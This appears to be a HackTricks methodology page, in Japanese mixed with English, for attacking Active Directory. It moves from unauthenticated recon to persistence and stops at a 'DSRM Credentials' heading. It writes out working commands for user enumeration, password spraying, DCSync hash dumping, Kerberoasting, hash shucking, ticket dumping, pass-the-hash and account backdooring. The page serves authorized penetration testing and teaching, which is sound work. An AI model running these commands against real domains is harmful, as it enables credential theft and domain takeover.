# Active Directory の方法論

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤技術として機能し、**network administrators** がネットワーク内で **domains**, **users**, および **objects** を効率的に作成・管理できるようにします。大規模にスケールするよう設計されており、多数のユーザを管理可能な **groups** や **subgroups** に整理し、さまざまなレベルでの **access rights** を制御できます。

**Active Directory** の構造は主に 3 層で構成されます: **domains**, **trees**, **forests**。**domain** は共通のデータベースを共有する **users** や **devices** といったオブジェクトの集合を含みます。**trees** は共通の構造で連結されたこれらのドメインのグループであり、**forest** は複数の trees が **trust relationships** を通じて相互接続された最上位の組織構造を表します。各レベルで特定の **access** や **communication rights** を指定できます。

**Active Directory** の主要な概念:

1. **Directory** – Active Directory オブジェクトに関するすべての情報を格納します。
2. **Object** – ディレクトリ内のエンティティを示し、**users**, **groups**, または **shared folders** などが含まれます。
3. **Domain** – ディレクトリオブジェクトのコンテナで、複数のドメインが **forest** 内で共存し、それぞれが独自のオブジェクト集合を保持できます。
4. **Tree** – 共通のルートドメインを共有するドメインのグルーピングです。
5. **Forest** – Active Directory における組織構造の最上位で、複数の trees とそれらの間の **trust relationships** で構成されます。

**Active Directory Domain Services (AD DS)** は、ネットワークの集中管理と通信に必要な一連のサービスを包含します。これらのサービスには次が含まれます:

1. **Domain Services** – データストレージを集中化し、**users** と **domains** 間の相互作用（**authentication** や **search** 機能など）を管理します。
2. **Certificate Services** – 安全な **digital certificates** の作成、配布、管理を監督します。
3. **Lightweight Directory Services** – **LDAP protocol** を介してディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – 複数の Web アプリケーションに対して **single-sign-on** を提供します。
5. **Rights Management** – 著作物の不正配布や使用を制御することで保護を支援します。
6. **DNS Service** – **domain names** の解決に不可欠です。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

AD を攻撃する方法を学ぶには、**Kerberos authentication process** を十分に理解する必要があります。\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## チートシート

簡易的にどのコマンドで AD を列挙/悪用できるかを確認するには、[https://wadcoms.github.io/](https://wadcoms.github.io) を参照してください。

> [!WARNING]
> Kerberos 通信は操作を行うために **full qualifid name (FQDN)** を必要とします。IP アドレスでマシンにアクセスしようとすると、**NTLM を使用し Kerberos ではありません**。

## Recon Active Directory (No creds/sessions)

AD 環境にアクセスはあるが資格情報／セッションがない場合、次のことが考えられます:

- **Pentest the network:**
- ネットワークをスキャンし、マシンや開いているポートを特定して **exploit vulnerabilities** したり、そこから **extract credentials** する（例えば、[printers could be very interesting targets](ad-information-in-printers.md)）。
- DNS の列挙により、web、printers、shares、vpn、media などドメイン内の主要サーバに関する情報が得られることがあります。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 詳細は一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を参照してください。
- **Check for null and Guest access on smb services** （これは最新の Windows バージョンでは動作しないことが多いです）:
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB サーバの列挙方法に関するより詳細なガイドは次を参照してください:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP の列挙に関するより詳細なガイド（**anonymous access** に特に注意）はこちら:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder を使用して **impersonating services** により資格情報を収集する（[**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)）。
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) によってホストにアクセスする。
- evil-S を使って **fake UPnP services** を公開し資格情報を収集する（[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)）。
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 内部ドキュメント、ソーシャルメディア、ドメイン内のサービス（主に web）および公開情報からユーザ名や氏名を抽出する。
- 社員のフルネームが判明すれば、さまざまな AD **username conventions** を試すことができます（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。一般的な慣例は次の通りです: _NameSurname_, _Name.Surname_, _NamSur_（各 3 文字ずつ）, _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 文字のランダムな英字 + 3 桁のランダムな数字（例: abc123）。
- ツール:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) と [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを参照してください。
- **Kerbrute enum**: 無効な username がリクエストされた場合、サーバは **Kerberos error** コード _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を返し、username が無効であることを判別できます。**Valid usernames** は AS-REP の中の **TGT** を返すか、または _KRB5KDC_ERR_PREAUTH_REQUIRED_ エラーを返し、ユーザに事前認証が要求されていることを示します。
- **No Authentication against MS-NRPC**: domain controllers 上の MS-NRPC (Netlogon) インターフェースに対して auth-level = 1 (No authentication) を使用する方法。MS-NRPC インターフェースにバインドした後、`DsrGetDcNameEx2` 関数を呼び出して、資格情報なしでユーザやコンピュータの存在を確認します。NauthNRPC ツールはこの種の列挙を実装しています。研究内容は次で確認できます。
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワークでこれらのサーバーのいずれかを見つけた場合、**user enumeration against it** を実行することもできます。例えば、ツール [**MailSniper**](https://github.com/dafthack/MailSniper) を使用できます:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### ユーザー名を1つまたは複数知っている場合

つまり、すでに有効なユーザー名はわかっているがパスワードがない... その場合は次を試してください:

- [**ASREPRoast**](asreproast.md): ユーザーが属性 _DONT_REQ_PREAUTH_ を**持っていない**場合、そのユーザーに対して**AS_REP message**を要求でき、ユーザーのパスワード派生鍵で暗号化されたデータを含むメッセージを入手できます。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに対して最も**common passwords**を試してみましょう。悪いパスワードを使っているユーザーがいるかもしれません（password policyを忘れずに）。
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

一部の**network**プロトコルを**poisoning**することで、クラックするためのチャレンジ**hashes**を**obtain**できる可能性があります:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC is blocked** によって signing でブロックされていても、**LDAP** のポスチャを確認してください: `netexec ldap <dc>` は `(signing:None)` / weak channel binding を示すことがあります。SMB signing が必須で LDAP signing が無効な DC は、**relay-to-LDAP** のターゲットとして **SPN-less RBCD** のような悪用に対して依然として有効です。

### クライアント側の printer credential leaks → bulk domain credential validation

- Printer/web UIs sometimes **embed masked admin passwords in HTML**. ソースや devtools を表示すると平文が露出することがあり（例: `<input value="<password>">`）、Basic-auth によるスキャン／プリントリポジトリへのアクセスを可能にします。
- 取得した印刷ジョブには、ユーザーごとのパスワードを含む **plaintext onboarding docs** が含まれていることがあります。テスト時はペアリングを揃えておいてください:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

もし **null or guest user** で他の **PCs or shares** にアクセスできるなら、SCF ファイルのようなファイルを **place files** して、誰かがそれにアクセスすると **あなたに対する NTLM authentication を trigger** し、**NTLM challenge** を **steal** してクラックすることができます:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** は、すでに所有しているすべての NT hash を、NT hash から直接派生する鍵材を持つ他の（より遅い）フォーマットに対する候補パスワードとして扱います。Kerberos RC4 チケット、NetNTLM チャレンジ、またはキャッシュされた認証情報の長いパスフレーズを総当たりする代わりに、NT ハッシュを Hashcat の NT-candidate モードに入力し、平文を知らずにパスワードの再利用を検証させます。ドメイン侵害後に何千もの現在および過去の NT ハッシュを収集できている場合、これは特に強力です。

次のような場合に shucking を使います:

- DCSync、SAM/SECURITY ダンプ、または資格情報 Vault からの NT コーパスを持っていて、他のドメイン／フォレストでの再利用をテストする必要がある場合。
- RC4 ベースの Kerberos 資料（`$krb5tgs$23$`, `$krb5asrep$23$`）、NetNTLM レスポンス、または DCC/DCC2 ブロブをキャプチャした場合。
- 長くてクラック困難なパスフレーズの再利用を迅速に証明し、即座に Pass-the-Hash でピボットしたい場合。

この手法は、鍵が NT hash ではない暗号化タイプ（例: Kerberos etype 17/18 AES）には**機能しません**。ドメインが AES のみを強制する場合は、通常のパスワードモードに戻る必要があります。

#### Building an NT hash corpus

- **DCSync/NTDS** – `secretsdump.py` を履歴オプション付きで使い、可能な限り多くの NT ハッシュ（とその以前の値）を取得します:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

履歴エントリはアカウントごとに最大 24 個の以前のハッシュを Microsoft が保存するため、候補プールを大幅に広げます。NTDS シークレットを収穫する他の方法については次を参照してください:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（または Mimikatz の `lsadump::sam /patch`）はローカル SAM/SECURITY データやキャッシュされたドメインログオン（DCC/DCC2）を抽出します。重複を排除して、それらのハッシュを同じ `nt_candidates.txt` リストに追加します。
- **Track metadata** – 単にワードリストが 16 進のみを含んでいる場合でも、各ハッシュを生み出したユーザー名／ドメインを記録しておきます。Hashcat が当たり候補を出力したら、どのプリンシパルがパスワードを再利用しているかがすぐに分かります。
- 同一フォレストまたは信頼されたフォレストからの候補を優先してください。shucking 時のオーバーラップの可能性が最大化されます。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate 入力は **生の 32-hex NT hashes のままである必要があります**。ルールエンジンを無効にしてください（`-r` を使わない、ハイブリッドモードを使わない）— マングリングは候補鍵材を破損させます。
- これらのモードは本質的に速くなるわけではありませんが、NTLM のキー空間（M3 Max で約 30,000 MH/s）は Kerberos RC4（約 300 MH/s）より約 100×速いです。キュレーションされた NT リストをテストする方が、遅いフォーマットで全パスワード空間を探索するよりずっと安価です。
- 常に **最新の Hashcat ビルド** を実行してください（`git clone https://github.com/hashcat/hashcat && make install`）。モード 31500/31600/35300/35400 は最近追加されました。
- 現時点では AS-REQ Pre-Auth の NT モードはなく、AES etypes（19600/19700）は平文のパスワードが必要です。これらの鍵は UTF-16LE パスワードから PBKDF2 を介して導出されるため、raw NT hashes ではなく平文が必要になります。

#### Example – Kerberoast RC4 (mode 35300)

1. 低権限ユーザーでターゲット SPN の RC4 TGS をキャプチャします（詳細は Kerberoast ページ参照）:

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. あなたの NT リストでチケットを shuck します:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat は各 NT 候補から RC4 鍵を導出し、`$krb5tgs$23$...` ブロブを検証します。マッチがあれば、そのサービスアカウントがあなたの既存の NT ハッシュのいずれかを使用していることが確認できます。

3. すぐに PtH でピボットします:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

必要に応じて後で `hashcat -m 1000 <matched_hash> wordlists/` を使って平文を回復することも可能です。

#### Example – Cached credentials (mode 31600)

1. 侵害済みワークステーションからキャッシュされたログオンをダンプします:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 興味のあるドメインユーザーの DCC2 行を `dcc2_highpriv.txt` にコピーし、shuck します:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功したマッチは、あなたのリストですでに知られている NT ハッシュを返し、そのキャッシュユーザーがパスワードを再利用していることを証明します。これを直接 PtH に使用する（`nxc smb <dc_ip> -u highpriv -H <hash>`）か、高速な NTLM モードで総当たりして文字列を回復します。

NetNTLM チャレンジ応答（`-m 27000/27100`）や DCC（`-m 31500`）にも同じワークフローが適用されます。一致が特定されれば、relay、SMB/WMI/WinRM PtH を開始したり、オフラインでマスク／ルールを使って NT ハッシュを再クラックできます。



## Enumerating Active Directory WITH credentials/session

このフェーズでは、**有効なドメインアカウントの資格情報またはセッションを侵害している** 必要があります。もし有効な資格情報やドメインユーザーとしてのシェルを持っているなら、前に挙げたオプションが他のユーザーを侵害するための選択肢であり続けることを忘れないでください。

認証済み列挙を始める前に、**Kerberos double hop problem** を理解しておくべきです。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

アカウントを侵害することは、**ドメイン全体を侵害し始めるための大きな一歩** です。なぜなら Active Directory の列挙を開始できるからです:

ASREPRoast に関しては、今やすべての脆弱なユーザーを見つけられますし、Password Spraying に関しては **すべてのユーザー名のリスト** を取得して、侵害したアカウントのパスワード、空パスワード、新たに有望なパスワードを試すことができます。

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windows では `net user /domain`、`Get-DomainUser`、または `wmic useraccount get name,sid` で全てのドメインユーザー名を取得するのは非常に簡単です。Linux では `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` や `enum4linux -a -u "user" -p "password" <DC IP>` を使えます。

> この Enumeration セクションは短く見えるかもしれませんが、これが最も重要な部分です。リンク（主に cmd、powershell、powerview、BloodHound）にアクセスし、ドメインの列挙方法を学び、慣れるまで練習してください。評価中、これは DA に到達する方法を見つけるか、何もできないと判断する重要な瞬間になります。

### Kerberoast

Kerberoasting は、サービスに紐づいたユーザーアカウントが使用する **TGS tickets** を取得し、その暗号（ユーザーパスワードに基づく）をオフラインでクラックする手法です。

詳細は次を参照してください:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

いくつかの資格情報を入手したら、どの **machine** にアクセス可能かを確認できます。そのために、ポートスキャンに応じて複数のサーバへ様々なプロトコルで接続を試みるために **CrackMapExec** を使うことができます。

### Local Privilege Escalation

もし通常のドメインユーザーとして資格情報やセッションを侵害しており、そのユーザーでドメイン内の任意のマシンに **アクセス** できるなら、ローカルでの権限昇格と資格情報の収集を試みるべきです。ローカル管理者権限を得て初めて、他のユーザーのハッシュをメモリ（LSASS）やローカル（SAM）からダンプすることが可能になります。

この本には [**Windows のローカル権限昇格**](../windows-local-privilege-escalation/index.html) に関する完全なページと、[**チェックリスト**](../checklist-windows-privilege-escalation.md) があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) を使うのも忘れないでください。

### Current Session Tickets

現在のユーザーのセッションに、予期しないリソースへアクセスする権限を与えるような **tickets** が見つかる可能性は非常に **低い** ですが、次の点を確認することはできます：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### コンピュータ共有内のCredsを探す | SMB Shares

Now that you have some basic credentials you should check if you can **find** any **interesting files being shared inside the AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will **trigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Active DirectoryでのPrivilege escalation WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> これはかなり**ノイズ**が多いことに注意してください。**LAPS**がこれを**緩和**します。

### MSSQL Abuse & Trusted Links

ユーザーが**MSSQL instances にアクセスする権限**を持っている場合、MSSQL ホスト上で（SA として動作していれば）**コマンドを実行**したり、NetNTLM **hash** を**窃取**したり、さらには**relay attack** を実行できる可能性があります。\
また、ある MSSQL インスタンスが別の MSSQL インスタンスから信頼（database link）されている場合、ユーザーが信頼されたデータベースに対する権限を持っていれば、**信頼関係を使って他のインスタンスでもクエリを実行できる**ようになります。これらの信頼は連鎖することがあり、最終的にコマンドを実行できるような誤設定されたデータベースを見つけることがあり得ます。\
**データベース間のリンクは forest trusts をまたいで動作します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

サードパーティのインベントリやデプロイメントスイートは、しばしば資格情報やコード実行への強力な経路を公開しています。参照：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

もし [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性を持つ Computer オブジェクトを見つけ、かつそのコンピュータ上でドメイン権限を持っているなら、当該コンピュータにログインするすべてのユーザーのメモリから TGT をダンプすることが可能です。\
したがって、**Domain Admin がそのコンピュータにログインした場合**、その TGT をダンプして [Pass the Ticket](pass-the-ticket.md) を使ってなりすますことができます。\
constrained delegation のおかげで、**Print Server を自動的に乗っ取る**ことさえ可能です（幸運ならそれは DC でしょう）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

もしユーザーやコンピュータが "Constrained Delegation" を許可されている場合、そのユーザー/コンピュータは「あるコンピュータのいくつかのサービスに対して任意のユーザーを偽装してアクセスする」ことができます。\
従って、このユーザー/コンピュータのハッシュを**窃取**してしまえば、（ドメイン管理者であっても）任意のユーザーを偽装して対象のサービスにアクセスすることが可能になります。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

リモートコンピュータの Active Directory オブジェクトに対して **WRITE** 権限を持つことは、**昇格された権限でのコード実行**の達成につながります：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

侵害されたユーザーがドメインオブジェクトに対して持つ **興味深い権限** により、後で横移動や権限の**昇格**が可能になる場合があります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

ドメイン内で **Spool サービスがリッスンしている**のを発見した場合、それを**悪用して**新しい資格情報を**取得**し、権限を**昇格**させることができます。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**他のユーザー**が**侵害された**マシンに**アクセスする**場合、そのプロセスのメモリから資格情報を**収集**したり、彼らのプロセスにビーコンを**注入して**なりすますことが可能です。\
通常ユーザーは RDP でシステムにアクセスするため、サードパーティ RDP セッションに対して行える攻撃方法をいくつか示します：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** はドメイン参加コンピュータの **ローカル Administrator パスワード** を管理するシステムを提供し、それが**ランダム化され**、一意で、頻繁に**変更**されるようにします。これらのパスワードは Active Directory に保存され、アクセスは ACL を介して許可されたユーザーに制御されます。これらのパスワードにアクセスする十分な権限があれば、他のコンピュータへピボットすることが可能になります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

侵害されたマシンから**証明書を収集**することは、環境内で権限を昇格させる手段となり得ます：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

もし**脆弱なテンプレート**が設定されている場合、それを悪用して権限を昇格させることが可能です：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一度 **Domain Admin** あるいはより上位の **Enterprise Admin** の権限を得たら、ドメインデータベースである _ntds.dit_ を**ダンプ**できます。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

先に述べたテクニックのいくつかは、永続化にも使えます。\
例えば、次のようなことができます：

- ユーザーを [**Kerberoast**](kerberoast.md) に**脆弱にする**

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- ユーザーを [**ASREPRoast**](asreproast.md) に**脆弱にする**

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- ユーザーに [**DCSync**](#dcsync) 権限を付与する

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** は、特定のサービス用の正当な TGS チケットを、例えば **PC アカウントの NTLM hash** を使って作成する攻撃手法です。この方法はサービスの権限にアクセスするために用いられます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** は、Active Directory 環境における **krbtgt アカウントの NTLM hash** を攻撃者が取得することを含みます。krbtgt はすべての **TGT** を署名するために使われる特別なアカウントです。

攻撃者がこのハッシュを取得すると、任意のアカウント用の **TGT** を作成でき（Silver ticket attack のように）ます。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これらは、一般的な golden ticket 検出メカニズムを**回避する**ように偽造された golden ticket のようなものです。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**あるアカウントの証明書を持っている、またはそれを要求できること**は、たとえパスワードが変更されてもユーザーアカウントに永続化する非常に有効な方法です：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**証明書を使用することでドメイン内部で高権限の永続化を行う**こともできます：


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory の **AdminSDHolder** オブジェクトは、Domain Admins や Enterprise Admins のような**特権グループ**のセキュリティを確保するため、これらのグループに対して標準の **ACL** を適用することで不正な変更を防ぎます。しかし、この機能は悪用可能で、攻撃者が AdminSDHolder の ACL を変更して通常ユーザーにフルアクセスを与えると、そのユーザーはすべての特権グループに対して広範な制御を得ることになります。この保護機能は、厳重に監視されないと逆効果になり得ます。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

